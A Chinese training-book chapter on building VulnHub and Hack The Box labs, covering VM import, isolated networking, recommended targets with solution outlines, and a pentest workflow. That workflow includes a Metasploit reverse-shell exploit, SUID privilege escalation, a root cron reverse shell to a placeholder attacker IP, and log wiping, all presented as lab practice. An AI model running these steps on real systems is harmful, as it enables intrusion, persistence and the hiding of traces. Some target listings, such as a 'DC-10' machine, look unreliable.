# 第十四章 VulnHub靶场环境

## 14.1 环境概述

VulnHub是一个提供大量漏洞靶机的平台，旨在帮助安全爱好者和从业者进行渗透测试练习。这些靶机包含了各种真实的漏洞场景，从入门级到高级都有覆盖，是学习网络安全的绝佳资源。

本章将介绍VulnHub靶场的使用方法，包括靶机下载、导入、网络配置以及经典靶机推荐等内容。

### 14.1.1 VulnHub 介绍

VulnHub官网：https://www.vulnhub.com

主要特点：
- 提供数百个预配置的漏洞靶机
- 涵盖各种漏洞类型和难度级别
- 完全免费下载
- 支持VMware和VirtualBox
- 包含详细的Walkthrough（解题指南）

### 14.1.2 学习路径推荐

| 阶段 | 适合人群 | 推荐靶机 |
|------|----------|----------|
| 入门级 | 零基础初学者 | Kioptrix系列、Metasploitable2 |
| 进阶级 | 有一定基础 | DC系列、Brainpan |
| 高级 | 有经验的渗透测试员 | Hack The Box、OSCP备考系列 |
| 专项练习 | 特定领域提升 | Web类、Pwn类、逆向类 |

### 14.1.3 环境准备

**硬件要求：**

| 项目 | 最低配置 | 推荐配置 |
|------|----------|----------|
| CPU | 双核，支持VT-x | 四核以上 |
| 内存 | 8GB | 16GB以上 |
| 硬盘 | 200GB | 500GB SSD |
| 虚拟化软件 | VMware/VirtualBox | VMware Workstation Pro |

**软件准备：**
- VMware Workstation Pro 或 VirtualBox
- 攻击机（Kali Linux、Parrot OS等）
- 靶机（从VulnHub下载）

---

## 14.2 靶机下载与导入方法

### 14.2.1 访问VulnHub官网

#### 【通用】下载靶机

**步骤1：访问VulnHub网站**

> 操作位置：浏览器

```
1. 打开浏览器访问：https://www.vulnhub.com
2. 可以浏览首页推荐的靶机，或使用搜索功能
3. 点击进入目标靶机详情页
```

---

**步骤2：选择靶机版本**

> 操作位置：浏览器，靶机详情页

```
1. 查看靶机信息（难度、描述、知识点）
2. 找到"Download"链接
3. 根据虚拟化软件选择对应格式：
   - VMware: 下载 .ova 或 .zip（包含.vmx+.vmdk）
   - VirtualBox: 下载 .ova 格式
```

---

**步骤3：校验下载文件**

> 操作位置：本地电脑，下载目录

```bash
# Windows下使用PowerShell校验MD5
Get-FileHash -Algorithm MD5 C:\Downloads\靶机文件名.zip

# Linux下使用md5sum校验
md5sum /path/to/target.ova

# 建议同时校验SHA1/SHA256
sha256sum /path/to/target.ova
```

---

### 14.2.2 靶机文件格式

| 格式 | 说明 | 适用软件 |
|------|------|----------|
| .ova | Open Virtualization Format，虚拟机导出格式 | VMware、VirtualBox通用 |
| .ovf + .vmdk | 分开的配置文件和虚拟磁盘 | VMware、VirtualBox |
| .vmdk | 虚拟磁盘文件 | 需要手动创建虚拟机 |
| .7z / .zip | 压缩包，解压后使用 | 需要先解压 |

---

### 14.2.3 VMware 导入步骤

#### 【Windows环境】方法一：导入OVA文件

**步骤1：打开VMware Workstation**

> 操作位置：Windows桌面，点击"VMware Workstation"图标

---

**步骤2：导入OVA文件**

> 操作位置：VMware Workstation菜单

```
1. 点击菜单"文件" → "打开"
2. 或者使用快捷键 Ctrl+O
3. 浏览并选择下载的 .ova 文件
4. 点击"打开"
```

---

**步骤3：确认导入选项**

> 操作位置：VMware导入向导

```
1. 确认虚拟机名称
2. 选择存储路径（建议使用SSD）
3. 点击"导入"按钮
4. 等待导入完成（约5-10分钟）
```

---

**步骤4：验证虚拟机**

> 操作位置：VMware Workstation虚拟机列表

```
1. 确认虚拟机出现在列表中
2. 点击虚拟机名称
3. 点击"编辑虚拟机设置"
4. 检查硬件配置（内存、CPU、网络适配器）
```

---

#### 【Windows环境】方法二：使用现有虚拟磁盘

**步骤1：创建新虚拟机**

> 操作位置：VMware Workstation菜单

```
1. 点击菜单"文件" → "新建虚拟机"
2. 选择"自定义（高级）" → 点击"下一步"
3. 硬件兼容性保持默认 → 点击"下一步"
4. 选择"稍后安装操作系统" → 点击"下一步"
```

---

**步骤2：选择操作系统**

> 操作位置：VMware新建虚拟机向导

```
1. 选择客户机操作系统：
   - Linux靶机：选择"Linux"
   - Windows靶机：选择"Windows"
2. 选择版本（根据靶机系统选择）
3. 点击"下一步"
```

---

**步骤3：命名虚拟机**

> 操作位置：VMware新建虚拟机向导

```
1. 输入虚拟机名称（如：Kioptrix-Level1）
2. 选择存储路径
3. 点击"下一步"
```

---

**步骤4：配置硬件**

> 操作位置：VMware新建虚拟机向导

```
1. 处理器配置：根据主机性能分配（建议2核）
2. 内存配置：根据靶机要求分配（建议2GB）
3. 网络类型：选择"仅主机模式"或"NAT"
4. 点击"下一步"直到磁盘配置页面
```

---

**步骤5：选择现有虚拟磁盘**

> 操作位置：VMware新建虚拟机向导，磁盘配置页面

```
1. 选择"使用现有虚拟磁盘"
2. 点击"浏览"
3. 选择解压后的 .vmdk 文件
4. 点击"完成"
```

---

**步骤6：调整虚拟机设置**

> 操作位置：VMware虚拟机设置

```
1. 点击"编辑虚拟机设置"
2. 检查并调整：
   - 内存（建议2GB）
   - CPU（建议2核）
   - 网络适配器（选择仅主机或NAT模式）
3. 点击"确定"
```

---

#### 【Linux环境】VMware导入

**步骤1：安装VMware Workstation（可选）**

> 操作位置：Linux终端

```bash
# 下载VMware Workstation Pro
wget https://download3.vmware.com/software/workstation/VMware-Workstation-Full-17.x.x.x.tar.gz

# 解压
tar -xzf VMware-Workstation-Full-17.x.x.x.tar.gz

# 运行安装程序
cd vmware-installer
sudo ./vmware-install.pl
```

---

**步骤2：导入OVA文件**

> 操作位置：Linux终端

```bash
# 使用ovftool导入OVA（需要安装VMware OVF Tool）
ovftool --net:HOST="NAT" --net:GUEST="NAT" /path/to/target.ova /path/to/vmware/

# 或直接双击OVA文件在VMware中打开
```

---

### 14.2.4 VirtualBox 导入步骤

#### 【Windows环境】方法一：导入OVA文件

**步骤1：打开VirtualBox**

> 操作位置：Windows桌面，点击"Oracle VM VirtualBox"图标

---

**步骤2：导入虚拟电脑**

> 操作位置：VirtualBox菜单

```
1. 点击菜单"文件" → "导入虚拟电脑"
2. 或者点击工具栏"导入"按钮
3. 浏览并选择 .ova 文件
4. 点击"下一步"
```

---

**步骤3：检查配置**

> 操作位置：VirtualBox导入设置页面

```
1. 查看虚拟机配置信息
2. 可以调整以下设置：
   - 名称：虚拟机显示名称
   - 存储路径：虚拟机文件存放位置
   - 内存：为虚拟机分配的内存
   - CPU：分配的处理器数量
3. 勾选"重新初始化所有网卡的MAC地址"
4. 点击"导入"
```

---

**步骤4：等待导入完成**

> 操作位置：VirtualBox进度条

```
1. 导入过程可能需要5-15分钟
2. 导入完成后，虚拟机出现在左侧列表
```

---

#### 【Windows环境】方法二：使用现有虚拟磁盘

**步骤1：创建新虚拟机**

> 操作位置：VirtualBox管理器

```
1. 点击工具栏"新建"按钮
2. 输入虚拟机名称（如：DC-1）
3. 选择类型（如：Linux）
4. 选择版本（如：Ubuntu 64-bit）
5. 点击"下一步"
```

---

**步骤2：分配内存**

> 操作位置：VirtualBox新建虚拟机向导

```
1. 分配内存大小（建议2044MB）
2. 点击"下一步"
```

---

**步骤3：使用现有虚拟硬盘**

> 操作位置：VirtualBox新建虚拟机向导

```
1. 选择"使用现有的虚拟硬盘文件"
2. 点击文件夹图标
3. 点击"添加"按钮
4. 浏览并选择 .vmdk 文件
5. 点击"选择"
6. 点击"创建"
```

---

**步骤4：配置网络**

> 操作位置：VirtualBox虚拟机设置

```
1. 选中创建的虚拟机
2. 点击"设置"按钮
3. 选择"网络"选项卡
4. 网卡1：启用网络连接，连接方式选择"仅主机（Host-Only）网络"
5. 点击"确定"
```

---

#### 【Linux环境】VirtualBox命令行导入

**步骤1：安装VirtualBox**

> 操作位置：Linux终端

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y virtualbox

# 或从官方下载.deb包安装
wget https://download.virtualbox.org/virtualbox/7.0.x/virtualbox-7.0.x_Ubuntu_jammy_amd64.deb
sudo dpkg -i virtualbox-7.0.x_Ubuntu_jammy_amd64.deb
sudo apt -f install
```

---

**步骤2：使用VBoxManage导入**

> 操作位置：Linux终端

```bash
# 导入OVA文件
VBoxManage import /path/to/target.ova --vsys 0 --vmname "Kioptrix-Level1"

# 查看导入的虚拟机
VBoxManage list vms

# 配置网络
VBoxManage modifyvm "Kioptrix-Level1" --nic1 hostonly
VBoxManage modifyvm "Kioptrix-Level1" --hostonlyadapter1 vboxnet0
```

---

### 14.2.5 常见问题

#### 【通用】导入常见问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 导入失败 | 文件损坏或下载不完整 | 重新下载，校验MD5/SHA值 |
| 无法启动 | 磁盘格式不兼容 | 使用VDDK转换格式，或重新创建虚拟机 |
| 网络不通 | 网卡配置错误 | 检查网卡类型（e1000/VMware Vmxnet3）和网络模式 |
| 黑屏 | 显卡配置问题 | 调整显示设置，禁用3D加速，增加显存 |
| 启动报错 | CPU虚拟化未启用 | 重启进入BIOS，启用Intel VT-x或AMD-V |

---

#### 【Windows环境】VMware特定问题

| 问题 | 解决方法 |
|------|----------|
| 导入速度慢 | 确保磁盘有足够空间，避免使用网络磁盘 |
| 内存不足 | 关闭其他程序，或减少分配给虚拟机的内存 |
| 许可证过期 | 输入许可证密钥或使用免费版 |

---

#### 【Windows环境】VirtualBox特定问题

| 问题 | 解决方法 |
|------|----------|
| 提示"VERR_FILE_NOT_FOUND" | 检查文件路径是否包含中文或特殊字符 |
| USB设备无法识别 | 安装VirtualBox Extension Pack |
| 窗口太小 | 安装Guest Additions |

---

## 14.3 网络配置

### 14.3.1 网络模式选择

靶机网络模式根据实验需求选择：

| 网络模式 | 特点 | 适用场景 |
|----------|------|----------|
| 仅主机模式（Host-Only） | 与外部网络完全隔离，仅主机和同模式虚拟机互通 | 安全实验、攻防练习 |
| NAT模式 | 通过主机上网，虚拟机对外不可见 | 需要访问外网的实验 |
| 桥接模式 | 虚拟机直接连接物理网络 | 需要真实网络环境的实验 |

**推荐配置：**
- 攻击机（Kali）：同时连接仅主机和NAT
- 靶机：仅主机模式
- 目的：靶机与攻击机互通，但靶机不能访问外网（避免攻击范围扩大）

---

### 14.3.2 VMware 网络配置

#### 【Windows环境】配置仅主机网络

**步骤1：打开虚拟网络编辑器**

> 操作位置：VMware Workstation菜单

```
1. 点击菜单"编辑" → "虚拟网络编辑器"
2. 点击"更改设置"（需要管理员权限）
```

---

**步骤2：配置VMnet1**

> 操作位置：虚拟网络编辑器窗口

```
1. 选择"VMnet1"（仅主机模式）
2. 取消勾选"使用本地DHCP服务"（推荐，便于固定IP）
3. 设置子网IP：
   - 子网地址：192.168.56.0
   - 子网掩码：255.255.255.0
4. 点击"确定"
```

---

**步骤3：配置虚拟机网络**

> 操作位置：VMware虚拟机设置

```
1. 选中靶机虚拟机
2. 点击"编辑虚拟机设置"
3. 选择"网络适配器"
4. 选择"自定义" → 选择"VMnet1（仅主机模式）"
5. 点击"确定"
```

---

**步骤4：配置攻击机Kali**

> 操作位置：Kali Linux虚拟机

```bash
# 编辑网络配置
sudo nano /etc/network/interfaces
```

添加配置：

```
auto ens33
iface ens33 inet static
address 192.168.56.10
netmask 255.255.255.0
gateway 192.168.56.1
```

```bash
# 重启网络服务
sudo systemctl restart networking

# 或使用新配置重启网卡
sudo ifdown ens33 && sudo ifup ens33

# 验证IP配置
ip addr show ens33
```

---

#### 【Linux环境】VMware网络配置

**步骤1：编辑网络配置**

> 操作位置：Linux终端

```bash
# 编辑 vmnet1 配置
sudo nano /etc/vmware/networking
```

或使用VMware提供的工具：

```bash
# 使用vmnet-cli配置（如果可用）
sudo vmnet-cli --config /etc/vmware/networking
```

---

**步骤2：启动虚拟网络**

> 操作位置：Linux终端

```bash
# 重启VMware网络服务
sudo /etc/init.d/vmware stop
sudo /etc/init.d/vmware start

# 或使用systemctl
sudo systemctl restart vmware
```

---

### 14.3.3 VirtualBox 网络配置

#### 【Windows环境】配置仅主机网络

**步骤1：打开全局工具**

> 操作位置：VirtualBox管理器

```
1. 点击菜单"管理" → "工具" → "网络管理器"
2. 或使用快捷键 Ctrl+G
```

---

**步骤2：创建Host-Only网络**

> 操作位置：VirtualBox网络管理器窗口

```
1. 点击"创建"按钮
2. 新建的网络会出现在列表中
3. 选择该网络，点击"属性"
4. 配置：
   - IPv4地址：192.168.56.1
   - IPv4网络掩码：255.255.255.0
   - 勾选"启用DHCP服务器"（可选）
     - 服务器地址：192.168.56.254
     - 服务器掩码：255.255.255.0
     - 地址池：192.168.56.100 - 192.168.56.200
5. 点击"应用"
```

---

**步骤3：配置虚拟机网卡**

> 操作位置：VirtualBox虚拟机设置

```
1. 选中靶机虚拟机
2. 点击"设置"按钮
3. 选择"网络"选项卡
4. 网卡1：
   - 勾选"启用网络连接"
   - 连接方式：选择"仅主机（Host-Only）网络"
   - 界面名称：选择 vboxnet0
5. 点击"确定"
```

---

**步骤4：配置攻击机Kali**

> 操作位置：Kali Linux虚拟机

```bash
# 查看可用网卡
ip link show

# 配置静态IP
sudo nano /etc/network/interfaces
```

添加配置：

```
auto eth0
iface eth0 inet static
address 192.168.56.10
netmask 255.255.255.0
gateway 192.168.56.1
```

```bash
# 重启网络
sudo systemctl restart networking

# 验证配置
ip addr show eth0
```

---

### 14.3.4 IP地址获取与发现

#### 【通用】靶机IP发现方法

**方法一：在靶机上直接查看（如果能登录）**

> 操作位置：靶机虚拟机控制台

```bash
# Linux靶机
ifconfig
ip addr show
cat /etc/network/interfaces

# Windows靶机
ipconfig
ipconfig /all
```

---

**方法二：从攻击机扫描发现**

> 操作位置：Kali Linux攻击机

```bash
# 使用netdiscover发现主机
sudo netdiscover -i eth0 -r 192.168.56.0/24

# 使用nmap扫描
sudo nmap -sn 192.168.56.0/24 -oG - | grep -i "up"

# 使用arp-scan
sudo arp-scan -l

# 使用ping扫描（快速）
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.56.$i & done
```

---

**方法三：查看虚拟化软件DHCP分配**

> 操作位置：VMware/VirtualBox设置

```
VMware：编辑 → 虚拟网络编辑器 → DHCP设置
VirtualBox：管理 → 工具 → 网络管理器 → DHCP服务器
```

---

### 14.3.5 常见问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 攻击机无法ping通靶机 | 网络模式不一致 | 确保两者都在同一网络模式（仅主机） |
| 靶机无法获取IP | DHCP未启用 | 检查虚拟网络编辑器/VirtualBox网络设置 |
| 网络不通 | 防火墙阻止 | 关闭靶机和攻击机的防火墙 |
| 虚拟机无法启动 | 虚拟网络冲突 | 检查是否有其他软件占用VMware/VirtualBox端口 |

---

## 14.4 经典靶机推荐

### 14.4.1 Kioptrix 系列

**靶机介绍：**
Kioptrix是VulnHub上最经典的入门级靶机系列，适合完全没有基础的初学者。

**系列成员：**
- Kioptrix Level 1 (#1) - 入门级
- Kioptrix Level 1.1 (#2) - 初级
- Kioptrix Level 1.2 (#3) - 中级
- Kioptrix Level 1.3 (#4) - 中级
- Kioptrix: 2014 (#5) - 中高级

**下载地址：**
```
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
```

**难度评级：** ⭐（1/5）

**知识点覆盖：**
- 信息收集与端口扫描
- 服务枚举
- 已知漏洞利用
- SQL注入
- 权限提升
- 凭证破解

**通关思路（Level 1）：**

```
1. nmap扫描发现开放端口（22, 80, 111, 139, 443, 1024）
2. 枚举Samba服务版本（Samba 2.2.1a）
3. 使用metasploit利用Samba漏洞获取shell
4. 验证root权限
```

---

### 14.4.2 Metasploitable 系列

**靶机介绍：**
Metasploitable是由Metasploit团队制作的漏洞测试虚拟机，包含大量已知漏洞。

**系列成员：**
- Metasploitable 1 - 早期版本
- Metasploitable 2 - 经典版本
- Metasploitable 3 - 最新版本（支持Windows和Linux）

**下载地址：**
```
Metasploitable 2:
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Metasploitable 3 (Linux):
https://github.com/rapid7/metasploitable3

Metasploitable 3 (Windows):
https://github.com/rapid7/metasploitable3-msf-windows
```

**难度评级：** ⭐⭐（2/5）

**知识点覆盖：**
- 各类服务漏洞
- Web应用漏洞
- 数据库漏洞
- 后门和木马
- 提权漏洞

**主要漏洞服务：**

| 服务 | 端口 | 漏洞 |
|------|------|------|
| Apache Tomcat | 8180 | 弱口令 |
| Samba | 139, 445 | 用户名枚举, 代码执行 |
| MySQL | 3306 | 弱口令 |
| PostgreSQL | 5432 | 弱口令 |
| VSFTPD | 21 | 后门（笑脸漏洞） |
| UnrealIRCd | 6667 | 后门 |
| distccd | 3632 | 代码执行 |
| fTPD | 21 | 匿名访问 |

---

### 14.4.3 DC 系列

**靶机介绍：**
DC系列是由DCAU7制作的一系列靶机，难度各异，涵盖了多种渗透测试技巧。

**系列成员：**

| 靶机 | 难度 | 主要漏洞 | 知识点 |
|------|------|----------|--------|
| DC-1 | 入门 | Drupal、RFI | 信息收集、SUID |
| DC-2 | 初级 | WordPress、rbash | WPScan、git提权 |
| DC-3 | 中级 | Joomla、RCE | SQL注入、udev提权 |
| DC-4 | 初级 | 命令注入 | hydra、SUID |
| DC-5 | 中级 | 文件包含、日志投毒 | PHP函数利用 |
| DC-6 | 中级 | WordPress、Activity monitor | bash脚本提权 |
| DC-7 | 中级 | CMS、Docker | Drush、git历史 |
| DC-8 | 中级 | SQL注入、exim | 联合查询、缓冲区溢出 |
| DC-9 | 中级 | SQL注入、文件包含 | 堆叠注入、LFI |
| DC-10 | 高级 | DNS、区号链 | 多种漏洞组合 |

**下载地址：**
```
https://www.vulnhub.com/entry/dc-1,292/
```

**难度评级：** ⭐⭐⭐（3/5）

**DC-1 通关思路：**

```
1. 端口扫描：nmap -sV -sC -p- 靶机IP
2. 发现Drupal网站（端口80）
3. 使用Droopescan枚举Drupal版本
4. 利用Drupalgeddon漏洞（CVE-2014-3704）获取shell
5. 使用find命令查找SUID文件
6. 发现具有SUID权限的find命令
7. 使用find提权：./find . -exec /bin/bash -p \; -quit
8. 获取root权限
```

---

### 14.4.4 Brainpan

**靶机介绍：**
Brainpan是一个经典的缓冲区溢出练习靶机，非常适合学习Pwn入门。

**下载地址：**
```
https://www.vulnhub.com/entry/brainpan-1,51/
```

**难度评级：** ⭐⭐⭐（3/5）

**知识点覆盖：**
- 缓冲区溢出基础
- 逆向工程
- Python exploit开发
- 权限提升

**通关思路：**

```
1. nmap扫描发现9999端口和8080端口
2. 访问8080端口发现Web目录扫描工具
3. 下载分析brainpan.exe程序
4. 使用IDA Pro分析发现缓冲区溢出漏洞
5. 使用msf-pattern_create定位偏移量
6. 查找坏字符
7. 查找JMP ESP地址
8. 编写Python exploit生成shellcode
9. 获取靶机shell
10. 使用buffer overflow for linux privilege escalation提权
```

---

### 14.4.5 Jarvis

**靶机介绍：**
Jarvis是一个中等难度的Web靶机，包含SQL注入、命令执行等Web漏洞。

**下载地址：**
```
https://www.vulnhub.com/entry/jarvis-1,397/
```

**难度评级：** ⭐⭐⭐（3/5）

**通关思路：**

```
1. nmap扫描发现80端口（Apache）
2. 使用gobuster进行目录扫描
3. 发现/phpmyadmin路径
4. SQL注入获取管理员凭证
5. 登录phpmyadmin
6. 写入Webshell到网站目录
7. 获取webshell
8. 使用sudo -l发现可以以sudo运行简单提权
9. 提权获取root
```

---

### 14.4.6 更多推荐靶机

| 靶机名称 | 难度 | 主要知识点 | 下载地址 |
|----------|------|------------|----------|
| Mr.Robot | ⭐⭐ | WordPress、哈希破解 | vulnhub.com/entry/mr-robot-1,151 |
| StuxCTF | ⭐⭐⭐ | Web、逆向、提权 | vulnhub.com/entry/stuxctf-1,200 |
| NullByte | ⭐⭐ | SQL注入、内核提权 | vulnhub.com/entry/nullbyte-1,100 |
| SickOs | ⭐⭐⭐ | Web、命令执行 | vulnhub.com/entry/sickos-1,132 |
| Btrfys | ⭐⭐⭐ | Web、本地提权 | vulnhub.com/entry/btrefys-1,218 |
| SkyTower | ⭐⭐ | SQL注入、代理 | vulnhub.com/entry/skytower-1,140 |
| pWnOS | ⭐⭐ | Web漏洞、提权 | vulnhub.com/entry/pwnos-20,137 |
| TrollCave | ⭐⭐⭐ | Web、SSRF | vulnhub.com/entry/trollcave-1,200 |
| HackDay: Albania | ⭐⭐⭐ | Web、提权 | vulnhub.com/entry/hackday-albania-1,188 |
| BornToSec | ⭐⭐⭐ | Web、内核提权 | vulnhub.com/entry/borntosec-1,108 |

---

## 14.5 Hack The Box 介绍

### 14.5.1 HTB 简介

Hack The Box（HTB）是一个在线的渗透测试平台，提供大量在线靶机供练习。

**特点：**
- 在线靶机，无需本地安装
- 实时排行榜
- 活跃的社区
- 从入门到高级都有
- 包含正式机、启动器、挑战赛

官网：https://www.hackthebox.com

### 14.5.2 注册与连接

#### 【通用】注册账号

**步骤1：访问HTB官网**

> 操作位置：浏览器

```
1. 访问 https://www.hackthebox.com
2. 点击右上角"Join"
3. 输入邮箱、用户名、密码
4. 完成验证（可能需要邀请码）
```

---

#### 【通用】获取邀请码

**步骤1：通过邀请函页面获取**

> 操作位置：浏览器，HTB邀请页面

```
1. 访问 https://www.hackthebox.com/invite
2. 按F12打开开发者工具
3. 在Console中执行 invite函致
4. 或查看页面源码寻找邀请码生成逻辑
```

---

#### 【通用】连接VPN

**步骤1：下载OpenVPN配置**

> 操作位置：HTB网页端

```
1. 登录HTB
2. 点击右上角"Access" → "Download VPN"
3. 选择合适的服务器节点
4. 下载.ovpn文件
```

---

**步骤2：启动VPN连接**

> 操作位置：攻击机终端

```bash
# Linux/Kali启动VPN
sudo openvpn /path/to/htb.ovpn

# 输入HTB账号密码
# 连接成功后，会看到 "Initialization Sequence Completed"
```

---

**步骤3：验证连接**

> 操作位置：攻击机终端

```bash
# 检查VPN是否正常
ip addr show tun0

# ping HTB网关测试
ping 10.10.14.1

# 查看分配到的IP
# 应该显示 10.10.x.x 格式的IP
```

---

### 14.5.3 推荐入门靶机

| 机器名 | 难度 | 主要知识点 | 备注 |
|--------|------|------------|------|
| Lame | Easy | Samba漏洞 | 经典SMB用户名枚举漏洞 |
| Legacy | Easy | SMB漏洞 | EternalBlue（MS17-010） |
| Devel | Easy | IIS FTP | FTP写入webshell |
| Optimum | Easy | HttpFileServer | ReGeorg webshell |
| Blue | Easy | SMB漏洞 | EternalBlue |
| Arctic | Easy | ColdFusion | Adobe ColdFusion漏洞 |
| Grandpa | Easy | IIS WebDAV | CVE-2017-7269 |
| Granny | Easy | IIS WebDAV | CVE-2017-7269 |

---

### 14.5.4 常见问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 无法连接VPN | 端口被阻止 | 尝试更换端口（443）或协议 |
| 邀请码获取失败 | 页面更新 | 查看社区教程或使用自动化脚本 |
| VPN断开 | 网络不稳定 | 检查网络连接，尝试使用稳定网络 |
| 靶机ping不通 | 防火墙 | 检查本地防火墙配置 |

---

## 14.6 渗透测试标准流程

### 14.6.1 信息收集

#### 【通用】端口扫描

**步骤1：主机发现**

> 操作位置：Kali Linux攻击机

```bash
# nmap主机发现
nmap -sn 192.168.56.0/24

# netdiscover扫描（局域网）
sudo netdiscover -i eth0 -r 192.168.56.0/24

# arp-scan扫描
sudo arp-scan -l
```

---

**步骤2：端口扫描**

> 操作位置：Kali Linux攻击机

```bash
# 快速端口扫描
nmap -T4 -F 靶机IP

# 全端口扫描
nmap -p- 靶机IP

# 服务版本扫描
nmap -sV -sC -p 1-1000 靶机IP

# 完整扫描（包含脚本）
nmap -A -p- 靶机IP -oA full_scan
```

---

**步骤3：服务枚举**

> 操作位置：Kali Linux攻击机

```bash
# 枚举SMB服务
nmap --script=smb-enum* 靶机IP

# 枚举HTTP服务
nmap --script=http-enum 靶机IP

# 枚举DNS服务
nmap --script=dns-zone-transfer -p 53 靶机IP

# 枚举SSH服务
nmap -p 22 --script=sshv1,ssh-hostkey 靶机IP
```

---

### 14.6.2 漏洞分析

#### 【通用】漏洞查找

**步骤1：搜索漏洞信息**

> 操作位置：Kali Linux攻击机

```bash
# 使用searchsploit搜索Exploit-DB
searchsploit samba 3.0

# 使用msfconsole搜索
msfconsole -q
search samba

# 使用nmap脚本扫描漏洞
nmap --script=vuln 靶机IP
```

---

**步骤2：漏洞验证**

> 操作位置：Kali Linux攻击机

```bash
# 使用msfconsole验证漏洞
msfconsole
use exploit/linux/samba/username_map_script
show options
set RHOSTS 靶机IP
run
```

---

### 14.6.3 漏洞利用

#### 【通用】Metasploit利用

**步骤1：启动msfconsole**

> 操作位置：Kali Linux攻击机

```bash
msfconsole
```

---

**步骤2：搜索相关模块**

```
msf6 > search smb
msf6 > use exploit/linux/samba/username_map_script
```

---

**步骤3：配置exploit**

```
msf6 exploit(linux/samba/username_map_script) > set RHOSTS 靶机IP
msf6 exploit(linux/samba/username_map_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(linux/samba/username_map_script) > set LHOST 攻击机IP
msf6 exploit(linux/samba/username_map_script) > set LPORT 4444
msf6 exploit(linux/samba/username_map_script) > exploit
```

---

### 14.6.4 后渗透

#### 【通用】信息收集

**步骤1：获取shell后信息收集**

> 操作位置：Meterpreter shell

```bash
# 查看系统信息
sysinfo

# 查看用户
getuid

# 查看网络配置
ipconfig /all

# 查看路由
route

# 查看进程
ps

# 查看密码哈希（需要提权后）
hashdump
```

---

#### 【通用】权限提升**

**步骤1：查找提权方法**

```bash
# Linux：查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# Linux：检查sudo权限
sudo -l

# Linux：查找可写文件
find / -writable -type f 2>/dev/null | head -20

# Windows：查找服务漏洞
./winPEAS.exe
```

---

**步骤2：利用提权**

```bash
# Linux SUID提权（find命令）
find / -exec /bin/bash -p \; -quit

# Linux sudo提权
sudo su -

# 内核漏洞提权
searchsploit "Linux Kernel" | grep 本版本
```

---

### 14.6.5 持久化与清理

#### 【通用】持久化（仅靶场练习）**

```bash
# 添加SSH公钥
mkdir ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 添加cron任务
echo "*/5 * * * * /bin/bash -i >& /dev/tcp/攻击机IP/4444 0>&1" >> /var/spool/cron/crontabs/root
```

---

#### 【通用】清理痕迹（仅靶场练习）**

```bash
# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# 删除上传文件
rm /tmp/payload.sh

# 恢复修改的文件
```

---

## 14.7 靶场环境管理

### 14.7.1 虚拟机快照

#### 【Windows环境】VMware快照操作

**步骤1：拍摄快照**

> 操作位置：VMware Workstation

```
1. 选中虚拟机
2. 点击"虚拟机"菜单 → "快照" → "拍摄快照"
3. 输入快照名称和描述
4. 点击"拍摄快照"
```

---

**步骤2：恢复快照**

> 操作位置：VMware Workstation

```
1. 选中虚拟机
2. 点击"虚拟机"菜单 → "快照" → "快照管理器"
3. 选择要恢复的快照
4. 点击"转到"
5. 确认恢复
```

---

#### 【Windows环境】VirtualBox快照操作

**步骤1：拍摄快照**

> 操作位置：VirtualBox管理器

```
1. 选中虚拟机
2. 点击"快照"选项卡
3. 点击相机图标"拍摄快照"
4. 输入快照名称和描述
5. 点击"确定"
```

---

**步骤2：恢复快照**

> 操作位置：VirtualBox管理器

```
1. 选中虚拟机，点击"快照"选项卡
2. 选择要恢复的快照
3. 点击"恢复"图标
4. 确认恢复（可选：同时恢复当前快照）
```

---

### 14.7.2 靶机分类管理

#### 【通用】目录结构建议

```
VulnHub/
├── 入门级/
│   ├── Kioptrix/
│   │   ├── Level1/
│   │   ├── Level2/
│   │   └── Level3/
│   ├── Metasploitable/
│   │   ├── MSF2/
│   │   └── MSF3/
│   └── DC系列/
│       ├── DC-1/
│       └── DC-2/
├── 进阶级/
│   ├── Brainpan/
│   ├── SickOs/
│   └── Jarvis/
└── 工具/
    ├── exploits/
    └── wordlists/
```

---

### 14.7.3 学习记录管理

#### 【通用】记录模板

```markdown
# 靶机名称 - 学习笔记

## 基本信息
- IP地址：192.168.56.101
- 难度：入门/初级/中级/高级
- 完成时间：2024-xx-xx

## 信息收集
- 开放端口：22, 80, 111, 139, 445, 1024
- 服务版本：Samba 2.2.1a, Apache 2.2.8

## 漏洞点
1. Samba服务存在远程代码执行漏洞
2. 版本：Samba 2.2.1a - 'username map script' RCE

## 利用过程
### 步骤1：扫描端口
nmap -sV -sC -p- 192.168.56.101

### 步骤2：利用Samba漏洞
msfconsole
use exploit/linux/samba/username_map_script
set RHOSTS 192.168.56.101
run

## 提权方法
- 使用find命令SUID提权
./find . -exec /bin/bash -p \; -quit

## 总结
- 学到了什么：Samba漏洞利用、SUID提权
- 不足之处：对漏洞原理理解不够深入
- 改进方向：深入研究Samba协议
```

---

## 14.8 安全注意事项

### 14.8.1 环境隔离

- **网络隔离**：靶机使用仅主机模式，不连接公网
- **专用环境**：不要在生产环境中运行攻击工具
- **专用设备**：使用专用的实验设备或虚拟机
- **数据备份**：定期备份重要数据

---

### 14.8.2 法律合规

- **仅用于学习**：仅用于学习和研究目的
- **禁止非法使用**：不得用于未经授权的渗透测试
- **遵守法律**：遵守当地法律法规
- **保护隐私**：尊重他人隐私和财产

---

### 14.8.3 道德规范

- **不公开漏洞**：不公开未授权的漏洞利用
- **打码发布**：发布Writeup时注意打码敏感信息
- **尊重原创**：尊重原作者劳动成果
- **积极分享**：积极分享学习心得和经验

---

## 14.9 常见问题汇总

### 【通用】环境配置问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 虚拟机无法启动 | VT-x/AMD-V未启用 | 重启进入BIOS，启用虚拟化技术 |
| 内存不足 | 分配内存过大 | 减少虚拟机内存分配，或增加宿主机内存 |
| 磁盘空间不足 | 快照占用大量空间 | 清理不需要的快照，扩展磁盘 |
| 导入失败 | 文件损坏 | 重新下载，校验MD5 |

---

### 【通用】网络连接问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 攻击机ping不通靶机 | 网络模式不一致 | 确保在同一网络模式（仅主机） |
| 靶机无法访问外网 | NAT模式未配置 | 确认VMware/VirtualBox NAT服务运行 |
